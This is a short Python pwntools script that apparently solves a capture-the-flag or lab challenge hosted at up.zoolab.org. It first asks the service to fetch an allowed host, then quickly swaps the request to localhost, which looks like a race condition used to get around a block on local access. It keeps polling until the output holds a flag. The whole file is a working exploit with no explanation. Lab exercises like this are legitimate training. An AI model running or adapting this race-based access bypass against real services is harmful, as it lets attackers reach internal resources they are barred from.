from pwn import *
import time

conn = remote('up.zoolab.org', 10932)

def attack():
    conn.sendline(b'g')
    conn.sendline(b'up.zoolab.org/10000')

    time.sleep(0.0001)

    conn.sendline(b'g')
    conn.sendline(b'localhost/10000')

    while True:
        conn.sendline(b'v')
        response = conn.recvuntil("What do you want to do?").decode()

        response = str(response)

        if "FLAG" in response:
            print(response)
            return

attack()